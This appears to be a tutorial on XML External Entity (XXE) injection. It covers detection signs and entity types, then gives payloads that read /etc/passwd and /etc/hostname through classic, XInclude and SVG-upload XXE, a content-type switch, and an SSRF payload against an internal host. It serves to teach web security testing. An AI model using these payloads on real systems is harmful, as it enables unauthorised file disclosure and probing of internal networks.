
# XML External Enitity Injection 

XXE Injection is a web security vulnerability that occurs when an application parses XML input and allows external entities to be processed. It allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.

---
## Detection

Detecting XML External Entity (XXE) Injection involves checking whether an application parses XML input and allows external entities to be resolved.

Signs that an application processes XML:
• Content-Type: application/xml or text/xml
• XML formatted request bodies (`<tag>`)
• SOAP endpoints
• XML file uploads (SVG, DOCX, XLSX)
• XML parsing error messages

**Internal Entity**: If an entity is declared within a DTD it is called an internal entity. Syntax: `<!ENTITY entity_name "entity_value">`

**External Entity**: If an entity is declared outside a DTD it is called an external entity. Identified by `SYSTEM`. Syntax: `<!ENTITY entity_name SYSTEM "entity_value">`

Internal Entity Example Code: 
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

Types of entities in XML:

| Type             | Prefix   | Where usable                | Example                                             |
| ---------------- | -------- | --------------------------- | --------------------------------------------------- |
| General entity   | `&name;` | Inside XML document content | `<firstName>&name;</firstName>`                     |
| Parameter entity | `%name;` | Only inside the DTD         | `<!DOCTYPE replace [<!ENTITY name "Doe"> %name; ]>` |

---

## XXE to Retrieve Files

This happens when the XML parser **resolves external entities** and the application reflects the parsed value in the response.

Original Request Body:
```
<?xml version="1.0" encoding="UTF-8"?> 
<stockCheck><productId>381</productId></stockCheck>
```

Classic XXE payload to retrieve `/etc/passwd` file: 
```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### XInclude attacks

Some applications receive client-submitted data, embed it on the server-side into an XML document, and then parse the document. Classic XXE attack, because you don't control the entire XML document

XInclude XXE Payload:
```
`<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>`
```

HTTP Request Body:
```
# Original Body
productId=1&storeId=1

# Malicious

productId=1<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

### XXE attacks via file upload

Some applications allow users to upload files which are then processed server-side. Some common file formats use XML or contain XML subcomponents. 

SVG Image file Example: 
```
`<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"           xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
	<text font-size="16" x="0" y="16">&xxe;</text>
</svg>`
```

### XXE attacks via modified content type

Original Request:
```
POST /action HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 7 

foo=bar
```

Malicious Request:
```
POST /action HTTP/1.0 
Content-Type: text/xml 
Content-Length: 52 

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```


---
## XXE to Perform SSRF Attacks

XXE can be combined with the SSRF Vulnerability to target another service on the network.

```
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

---
## Blind XXE Vulnerabilities

In Blind XXE application does not return the values of any defined external entities in its responses, and so direct retrieval of server-side files is not possible.
